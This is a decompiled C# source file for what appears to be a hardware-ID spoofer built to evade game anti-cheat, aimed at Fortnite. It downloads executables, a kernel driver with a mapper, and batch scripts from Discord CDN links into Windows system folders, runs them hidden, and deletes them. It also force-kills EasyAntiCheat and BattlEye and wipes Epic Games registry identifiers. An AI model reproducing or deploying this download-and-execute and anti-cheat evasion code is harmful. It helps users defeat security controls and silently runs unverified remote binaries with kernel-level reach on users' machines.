using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Principal;
using System.Threading;

namespace Core
{
	internal class Spoof
	{
		public static void SpoofHDD()
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\IME\\mapper.exe";
			string text2 = "C:\\Windows\\IME\\spoof.sys";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660984792061313024/mapper_3.exe", text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660983927883825163/spoofer.sys", text2);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text, text2);
			Thread.Sleep(1000);
			process.Close();
			File.Delete(text);
			File.Delete(text2);
		}

		public static void CleanTraces(string loc)
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
			process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
			process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\" + Spoof.SIDCleaner + "\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("exit");
			WebClient webClient = new WebClient();
			WebClient webClient2 = new WebClient();
			WebClient webClient3 = new WebClient();
			WebClient webClient4 = new WebClient();
			WebClient webClient5 = new WebClient();
			WebClient webClient6 = new WebClient();
			WebClient webClient7 = new WebClient();
			WebClient webClient8 = new WebClient();
			WebClient webClient9 = new WebClient();
			WebClient webClient10 = new WebClient();
			string text = "C:\\Windows\\IME\\cleaner1.bat";
			string text2 = "C:\\Windows\\IME\\cleaner2.bat";
			string text3 = "C:\\Windows\\IME\\cleaner3.bat";
			string text4 = "C:\\Windows\\IME\\cleaner4.bat";
			string text5 = "C:\\Windows\\IME\\cleaner5.bat";
			string text6 = "C:\\Windows\\IME\\cleaner6.bat";
			string text7 = "C:\\Windows\\IME\\cleaner7.bat";
			string text8 = "C:\\Windows\\IME\\cleaner8.bat";
			string text9 = "C:\\Windows\\IME\\cleaner9.bat";
			string path = "C:\\Windows\\IME\\cleaner10.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/702889309136617477/710254724040884324/Run_1.bat", text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/702889309136617477/710254730294853672/Run_2.bat", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/702889309136617477/710254726331236422/Run_3.bat", text3);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/702889309136617477/710254730487791617/Run_4.bat", text4);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/702889309136617477/710254727538933820/Run_5.bat", text5);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/702674583303749662/708098860282675291/Cleaner_1.bat", text6);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/702674583303749662/708098863164293130/Cleaner_2.bat", text7);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/702672889593462824/710304074091987034/fortnite_source_code.bat", text8);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/702672889593462824/710304294020317255/Cleaner_3.bat", text9);
			Process process2 = new Process();
			process2.StartInfo.FileName = "cmd.exe";
			process2.StartInfo.RedirectStandardInput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = false;
			process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process2.Start();
			Thread.Sleep(1000);
			process2.StandardInput.WriteLine(loc ?? "");
			Thread.Sleep(15000);
			File.Delete(text);
			File.Delete(text2);
			File.Delete(text3);
			File.Delete(text4);
			File.Delete(text5);
			File.Delete(text6);
			File.Delete(text7);
			File.Delete(text8);
			File.Delete(text9);
			File.Delete(path);
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00003484 File Offset: 0x00003484
		public static void start(string v)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Logs\\Core_Spoofer.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/702672889593462824/711077517720813628/Core_Spoofer.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text);
			File.Delete(text);
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000034F8 File Offset: 0x000034F8
		internal static void start()
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Logs\\HWID_Changer_By_Neos07.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/711674545060315168/712889381995806730/HWID_Changer_By_Neos07.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text);
			Thread.Sleep(1000000);
			process.Close();
			File.Delete(text);
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00003580 File Offset: 0x00003580
		private static void Close()
		{
			WebClient webClient = new WebClient();
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00003594 File Offset: 0x00003594
		internal static void Checker()
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Logs\\9kv8Jgmw0df.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/702672889593462824/710365605743689778/9kv8Jgmw0df.bat", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text);
			Thread.Sleep(30000);
			process.Close();
			File.Delete(text);
		}

		// Token: 0x04000002 RID: 2
		private static string SIDCleaner = WindowsIdentity.GetCurrent().User.Value;

		// Token: 0x04000003 RID: 3
		private static string loc;
	}
}
